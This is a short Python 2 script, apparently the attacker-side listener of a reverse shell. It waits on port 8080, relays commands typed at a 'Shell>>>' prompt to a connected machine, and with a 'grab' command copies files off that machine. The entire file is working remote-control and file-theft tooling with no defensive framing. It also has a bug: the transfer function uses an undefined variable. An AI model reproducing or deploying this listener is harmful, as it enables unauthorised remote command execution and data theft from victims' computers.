import socket, os

def transfer(conn, path):
	conn.send(command)
	fd = open('/root/Desktop/test.png', 'wb')
	while True:
		bits =  conn.recv(1024)

		if 'Unable to find file' in bits:
			print '[-]File not found'
			break

		if bits.endswith('DONE'):
			print '[*]Transfer completed'
			fd.close()
			break
		fd.write(bits)
	fd.close()

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('192.168.56.103', 8080))
	s.listen(1)
	print '[+]Listening on port 8080'
	conn, addr = s.accept()
	print '[+]Received Connection from', addr

	while True:
		command = raw_input('Shell>>>')

		if 'terminate' in command:
			conn.send('terminate')
			conn.close()
			break

		elif 'grab' in command:
			transfer(conn, command)

		else:
			conn.send(command)
			print conn.recv(1024)

if __name__ == '__main__':
	connect()
